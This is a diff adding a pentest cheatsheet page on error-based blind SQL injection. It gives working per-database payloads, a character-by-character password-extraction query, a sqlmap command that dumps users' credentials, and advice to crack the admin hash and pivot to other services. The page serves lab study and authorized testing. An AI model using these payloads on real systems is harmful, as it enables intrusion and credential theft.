@@ -1,0 +1,114 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Error-based Blind SQLi · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › SQL Injection</nav><h1>Error-based Blind SQLi</h1><p class="cx-lede">Extracting data when the only observable difference between true and false is whether the query throws a database error.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1213</span><span class="cx-tag">D3FEND D3-MH, D3-NTA</span><span class="cx-tag">IMPACT DataExfil</span><span class="cx-tag">OWASP A05</span></div><article class="cx-body"><p>The query output isn't reflected, the response body is identical for true and false conditions, and timing is unreliable - but the application returns a <strong>distinguishable error</strong> when the backend query fails. Force an error only when a condition is true, and the error itself becomes the boolean oracle.</p>
+<h2 id="tldr">TL;DR</h2>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- Oracle: divide by zero only when the condition is TRUE → DB error
+&#x27; AND (SELECT CASE WHEN (&lt;condition&gt;) THEN TO_CHAR(1/0) ELSE NULL END FROM dual) IS NULL-- -</code></pre></figure>
+<p>If <code>&lt;condition&gt;</code> is true the query errors (HTTP 500, a custom error page, a stack trace); if false it returns normally. Everything else works like <a href="../blind-boolean/index.html">boolean blind</a> - binary-search each character - except the signal is "errored vs. didn't" instead of "content changed".</p>
+<p>The trailing <code>IS NULL</code> matters: it turns the scalar subquery into a valid boolean predicate for the <code>AND</code>. On the false branch the subquery returns <code>NULL</code>, <code>NULL IS NULL</code> is true, and the query runs normally; on the true branch the engine must evaluate <code>1/0</code> and raises. Without it, <code>AND &lt;string-or-null&gt;</code> is a type error that fails on <em>both</em> branches, giving you no oracle.</p>
+<h2 id="when-to-use">When to use</h2>
+<table>
+<thead>
+<tr>
+<th>Symptom</th>
+<th>Class</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Errors printed with query output</td>
+<td><a href="../union-based/index.html">UNION-based</a> / error-based extraction</td>
+</tr>
+<tr>
+<td>Response differs on true vs. false condition</td>
+<td><a href="../blind-boolean/index.html">Boolean blind</a></td>
+</tr>
+<tr>
+<td>Response only differs in timing</td>
+<td><a href="../blind-time/index.html">Time-based blind</a></td>
+</tr>
+<tr>
+<td>Response identical, but a <em>condition-triggered error</em> changes it</td>
+<td><strong>This page</strong></td>
+</tr>
+<tr>
+<td>No feedback of any kind</td>
+<td><a href="../out-of-band/index.html">Out-of-band</a></td>
+</tr>
+</tbody>
+</table>
+<p>This is the method PortSwigger's "conditional errors" lab tests. Reach for it when boolean content differences don't exist but you can still provoke a visible error state, and before falling back to slow time-based extraction.</p>
+<h2 id="step-1-confirm-the-injection-is-interpreted-as-sql">Step 1 - Confirm the injection is interpreted as SQL</h2>
+<p>A single quote may already throw an error. Prove the error is <em>SQL</em> (not generic input rejection) by submitting syntactically valid subqueries and watching the error appear and disappear:</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27;                        → error (unbalanced quote)
+&#x27;&#x27;                       → no error
+&#x27;||(SELECT &#x27;&#x27;)||&#x27;        → may still error depending on DBMS
+&#x27;||(SELECT &#x27;&#x27; FROM dual)||&#x27;   → no error on Oracle (needs a table)</code></pre></figure>
+<div class="cx-aside cx-note">
+<p class="cx-aside-title">Note</p>
+<p>On Oracle every <code>SELECT</code> needs a <code>FROM</code>, so <code>FROM dual</code> resolving the error is itself a fingerprint - it tells you the backend is Oracle. See <a href="../dbms-cheatsheet/index.html">DBMS cheatsheet</a> for the equivalent no-op table on each engine (<code>dual</code> on Oracle/MySQL, <code>FROM (SELECT 1) x</code> or none on PostgreSQL/MSSQL).</p>
+</div>
+<h2 id="step-2-build-the-conditional-error">Step 2 - Build the conditional error</h2>
+<p>Pair a true/false condition with an expression that is only <em>evaluated</em> (and only errors) when the condition holds. Division by zero is the classic trigger. Use <code>1=1</code> to prove the error fires and <code>1=2</code> to prove it stops before plugging in a real condition.</p>
+<div class="cx-tabs">
+<div class="cx-tab">
+<p class="cx-tab-label">Oracle</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27; AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual) IS NULL-- -</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">PostgreSQL</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- divisor is itself the CASE, so 1/0 can only be reached on the true branch
+&#x27; AND (SELECT 1/(CASE WHEN (1=1) THEN 0 ELSE 1 END)) IS NULL-- -</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">MSSQL</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27; AND 1=(SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)-- -</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">MySQL / MariaDB</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- scalar subquery returns &gt;1 row (error) only on the true branch
+&#x27; AND (SELECT CASE WHEN (1=1) THEN (SELECT table_name FROM information_schema.tables) ELSE NULL END) IS NULL-- -</code></pre></figure>
+</div>
+</div>
+<p>Swap <code>1=1</code> for <code>1=2</code> and the error must disappear. If it fires on <em>both</em>, the trigger is being evaluated independently of the condition - see the first failure mode below.</p>
+<div class="cx-aside cx-caution">
+<p class="cx-aside-title">Caution</p>
+<p>PostgreSQL folds constant expressions at planning time, so a bare <code>CASE WHEN … THEN 1/0</code> can raise before the condition is ever checked - both branches error and you get no oracle. The fix above makes the <strong>divisor</strong> depend on the <code>CASE</code> (<code>1/(CASE … END)</code>), so <code>1/0</code> is only reachable when the true branch is chosen at execution. Once the condition references table data (Step 3) it can't be folded anyway.</p>
+</div>
+<h2 id="step-3-extract-character-by-character">Step 3 - Extract character by character</h2>
+<p>Replace the constant condition with a substring comparison, exactly as in <a href="../blind-boolean/index.html">boolean blind</a> - keep the same conditional-error wrapper, only the condition changes:</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27; AND (SELECT CASE WHEN
+  (SUBSTR((SELECT password FROM users WHERE username=&#x27;administrator&#x27;),1,1)=&#x27;a&#x27;)
+  THEN TO_CHAR(1/0) ELSE NULL END FROM dual) IS NULL-- -</code></pre></figure>
+<p>Error present → the character matches. Binary-search with <code>&gt;</code>/<code>&lt;</code> on <code>ASCII()</code>/<code>ORD()</code> to cut requests per character from ~94 to ~7, same algorithm as the boolean page. The data-dependent condition also sidesteps the PostgreSQL constant-folding problem, since the planner can't evaluate a per-row comparison ahead of time.</p>
+<h2 id="automation">Automation</h2>
+<p>To sqlmap this is a <strong>boolean-blind</strong> oracle - the error state is just its "true" response signature - so use <code>--technique=B</code>, not <code>E</code>. (sqlmap's <code>E</code> is <em>error-based extraction</em>, which scrapes data out of printed error-message text, a different technique covered under <a href="../union-based/index.html">UNION-based</a>.) Point it at a reliable true/false matcher:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">sqlmap -u &quot;https://&lt;TARGET&gt;/page&quot; --cookie=&quot;TrackingId=xyz*&quot; \
+  --technique=B --string=&quot;Internal Server Error&quot; \
+  --dbms=oracle --dump -T users -C username,password</code></pre></figure>
+<p><code>--string</code> (or <code>--code=500</code>) tells sqlmap what the "true"/errored response looks like.</p>
+<p>For manual control you can reuse the boolean-blind <a href="../blind-boolean/index.html#automation-with-ffuf">ffuf and bash loops</a>, but changing the match filter alone is not enough: those payloads compare a substring directly and produce a <em>content</em> difference, never an error. Swap the injected payload for the conditional-error wrapper above (so the comparison sits inside the <code>CASE</code>), then match on the error - e.g. <code>ffuf ... -mc 500</code>, or <code>-mr "error string"</code> when the error page returns 200.</p>
+<h2 id="common-failure-modes">Common failure modes</h2>
+<ul>
+<li><strong>The error fires on both <code>1=1</code> and <code>1=2</code>.</strong> The trigger is being evaluated independently of the condition - on PostgreSQL this is constant folding (see the Step 2 caution; make the divisor depend on the <code>CASE</code>). On other engines, make sure the erroring expression is only <em>reachable</em> through the true branch, not computed alongside it.</li>
+<li><strong>The app returns 200 with a generic error page.</strong> That is not necessarily a dead end: if the error page differs from the normal response at all - different text, different length - that difference <em>is</em> your oracle, and you're really doing <a href="../blind-boolean/index.html">boolean blind</a> with the error page as the "true" state. Only fall back to <a href="../blind-time/index.html">time-based</a> when the errored and successful responses are genuinely indistinguishable.</li>
+<li><strong>WAF blocks <code>1/0</code> or <code>CASE</code>.</strong> See <a href="../bypasses/index.html">Bypasses</a>; a subquery returning multiple rows (<code>(SELECT table_name FROM information_schema.tables)</code>) or a failing <code>CAST</code> are alternative error triggers.</li>
+</ul>
+<h2 id="notes">Notes</h2>
+<ul>
+<li>Capture one request/response pair showing the errored vs. clean state - it's clean evidence that the condition controlled the backend.</li>
+<li>This technique leaks nothing in the response body, so it often slips past response-diffing detection while still being noisy in DB error logs. Note that asymmetry in the report.</li>
+</ul>
+<h2 id="next-move">Next move</h2>
+<ul>
+<li><strong>Error oracle confirmed</strong> → automate with sqlmap <code>--technique=B --string=</code> / <code>--code=500</code>, or the boolean-blind scripts with the conditional-error payload matched on status code</li>
+<li><strong>Backend fingerprinted as Oracle via <code>FROM dual</code></strong> → use the <a href="../dbms-cheatsheet/index.html">DBMS cheatsheet</a> for Oracle-specific schema queries (<code>all_tables</code>, <code>all_tab_columns</code>)</li>
+<li><strong>No error oracle after all</strong> → <a href="../blind-time/index.html">Time-based blind</a>, then <a href="../out-of-band/index.html">Out-of-band</a> if timing is also unreliable</li>
+<li><strong>Extracted an admin hash</strong> → crack offline, then pivot to <a href="../../../network/services/mssql/index.html">MSSQL / WinRM / SSH</a> on the same host</li>
+<li><strong>Hardening this class out of an app</strong> → <a href="../defense/index.html">SQLi defense</a></li>
+</ul></article><nav class="cx-pager"><a class="cx-prev" href="../sqlmap/cheatsheet/index.html">Previous: Cheatsheet</a><a class="cx-next" href="../out-of-band/index.html">Next: Out-of-band SQLi</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
